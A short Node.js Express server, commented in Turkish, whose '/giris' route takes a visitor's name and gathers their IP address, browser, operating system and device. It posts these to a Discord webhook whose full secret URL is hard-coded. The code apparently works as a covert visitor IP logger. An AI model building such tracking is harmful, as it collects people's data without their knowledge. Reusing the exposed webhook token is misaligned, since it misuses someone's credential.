javascript
const express = require('express');
const app = express();
const port = 3000;
const fetch = require('node-fetch');
const useragent = require('useragent'); // npm install useragent

app.use(express.json());
app.use(express.static('public')); // HTML, CSS ve JS dosyalarını sunmak için

// Discord Webhook URL'nizi buraya girin
const discordWebhookUrl = 'https://discord.com/api/webhooks/1414444695458676756/EfWVnWWG1LaCOoSF2JoamnqtJ8DcAt4z8Wb--en40FiU1xa1UA2z0XIIh4Xh3mpa7j8C';

app.post('/giris', async (req, res) => {
    const isim = req.body.isim;
    const ipAdresi = req.ip; // Kullanıcının IP adresini al

    if (!isim) {
        return res.json({ success: false, message: 'İsim eksik!' });
    }

    // Tarayıcı bilgilerini al
    const userAgentString = req.headers['user-agent'];
    const agent = useragent.parse(userAgentString);
    const tarayici = agent.browser;
    const isletimSistemi = agent.os;
    const cihaz = agent.device.family;

    try {
        const discordMesaji = {
            embeds: [{
                title: 'Yeni Giriş Bilgileri',
                color: 0x00ff00, // Yeşil renk
                fields: [
                    { name: 'İsim', value: isim, inline: true },
                    { name: 'IP Adresi', value: ipAdresi, inline: true },
                    { name: 'Tarayıcı', value: tarayici, inline: true },
                    { name: 'İşletim Sistemi', value: isletimSistemi, inline: true },
                    { name: 'Cihaz', value: cihaz, inline: true }
                ],
                timestamp: new Date().toISOString(),
            }]
        };

        const response = await fetch(discordWebhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(discordMesaji)
        });

        if (response.ok) {
            console.log('Discord mesajı başarıyla gönderildi!');
            return res.json({ success: true });
        } else {
            console.error('Discord mesajı gönderilemedi:', response.status, await response.text());
            return res.json({ success: false, message: 'Discord mesajı gönderilemedi!' });
        }
    } catch (error) {
        console.error('Hata:', error);
        return res.json({ success: false, message: 'Bir hata oluştu!' });
    }
});

// IP adresini alabilmek için (örneğin, bir proxy kullanıyorsanız)
app.set('trust proxy', true);

app.listen(port, () => {
    console.log(`Sunucu ${port} portunda çalışıyor!`);
});